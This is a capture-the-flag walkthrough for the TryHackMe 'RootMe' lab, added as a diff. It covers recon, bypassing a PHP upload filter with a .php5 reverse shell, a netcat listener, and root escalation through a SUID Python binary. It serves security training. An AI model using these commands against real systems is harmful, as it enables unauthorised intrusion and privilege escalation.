@@ -1,0 +1,144 @@
+# 🧰 TryHackMe: RootMe - Write-up
+
+## 📌 Description
+
+RootMe is a beginner-friendly room on TryHackMe designed to teach users about:
+
+* Web-based exploitation (file upload vulnerabilities)
+* Reverse shells
+* Basic Linux privilege escalation (SUID abuse)
+
+---
+
+## 📍 Target Info
+
+| Service | Port | Version               |
+| ------- | ---- | --------------------- |
+| HTTP    | 80   | Apache 2.4.x (Ubuntu) |
+| SSH     | 22   | OpenSSH 7.x (Ubuntu)  |
+
+---
+
+## 🕵️ 1. Reconnaissance
+
+### 🔍 Nmap Scan
+
+
+nmap -sC -sV -oN nmap/rootme.txt <TARGET_IP>
+
+**Results:**
+
+
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
+
+
+### 🌐 Web Enumeration
+
+#### Check the website manually
+
+Open browser:
+`http://<TARGET_IP>`
+
+Nothing interesting on the home page. Check for hidden paths using `gobuster`:
+
+
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster.txt
+
+
+**Interesting Findings:**
+
+* `/uploads/`
+* `/panel.php`
+
+---
+
+🎯 2. Exploitation – File Upload Vulnerability
+🔍 Inspecting panel.php
+
+When accessing the /panel.php page on the web server, we find a file upload form. This form allows users to upload files to the server.
+
+🔐 File Extension Filter in Place
+
+To test the functionality, I tried uploading a basic PHP reverse shell with the .php extension.
+
+However, the server responded with an error and rejected the file.
+
+This indicates that the application is likely using a file extension filter to prevent the upload of files ending in .php, which could be executed by the server.
+
+🛠️ Bypassing the File Extension Filter
+
+While the server blocks .php files, it's important to understand that Apache (the web server) is often configured to execute other PHP-related extensions as well — such as .php5, .php4, or .phtml.
+
+To test this, I renamed my shell file to use the .php5 extension instead:
+
+### 🧲 Start Netcat Listener
+
+nc -lvnp <PORT>
+
+
+### ⬆️ Upload Payload
+
+* Upload `shell.php5` via `panel.php`
+* Navigate to:
+  `http://<TARGET_IP>/uploads/shell.php`
+
+### ✅ Result
+
+You should now have a reverse shell as `www-data`.
+
+---
+
+## 🔧 3. Post Exploitation & Shell Upgrade
+
+### 🆙 Upgrade Shell (optional but recommended)
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+## 🔍 4. Enumeration for Privilege Escalation
+
+Check for SUID binaries:
+
+find / -perm -4000 -type f 2>/dev/null
+
+**Interesting Result:**
+
+
+/usr/bin/python
+
+---
+
+## 🚀 5. Privilege Escalation - Python SUID Exploit
+
+If Python has the SUID bit set, you can use it to escalate privileges:
+
+
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+If that doesn’t work:
+
+
+/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+🎉 You should now be **root**.
+
+---
+
+## 🎯 6. Capture the Flags
+
+### 🏁 User Flag
+
+
+cat /home/<username>/user.txt
+
+
+### 🏁 Root Flag
+
+
+cat /root/root.txt
+
+
